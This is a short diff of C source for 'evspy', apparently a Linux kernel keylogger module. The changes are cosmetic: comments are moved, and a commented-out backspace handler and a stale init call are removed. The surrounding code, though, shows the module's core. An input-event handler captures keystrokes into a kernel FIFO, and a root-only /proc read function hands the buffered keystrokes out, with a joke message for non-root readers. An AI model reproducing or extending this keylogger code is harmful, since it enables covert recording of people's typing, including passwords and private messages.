@@ -39,8 +39,8 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 		int *eof, void *data)
 {
 	int n;
-	// root only plz
-	if (current_uid() || current_euid()) {
+
+	if (current_uid() || current_euid()) {		// root only plz
 #if EVS_TROLL == 1
 		n = min(36, count);
 		strncpy(page, "Trololololo lololo lololo\nhohohoho\n", n);
@@ -49,7 +49,7 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 #else
 		return -EPERM;
 #endif
-	} else {
+	} else {		// copy fifo contents to the supplied buffer
 		n = kfifo_out(&cbuffer, page, count);
 
 		if (kfifo_is_empty(&cbuffer))
@@ -156,11 +156,6 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	if (type != EV_KEY || unlikely(value == EVS_VAL_HOLD)) {
 		return;
 
-//	// Backspace
-//	} else if (code == KEY_BACKSPACE && value == EVS_VAL_PRESS) {
-//		evs_backspace();
-//		return;
-
 	// Special/unknown keys (alt, ctrl, esc, shift, etc)
 	} else if (code >= sizeof(map) || (map[code] == '.' && likely(code != KEY_DOT))) {
 		special_char(code, value);
@@ -239,7 +234,6 @@ static int __init evspy_init(void)
 #ifdef EVS_ALTGR_ENABLED
 	init_altgrmap();
 #endif
-	//cbuf_init();
 	INIT_KFIFO(cbuffer);
 	return input_register_handler(&evspy_handler);
 }
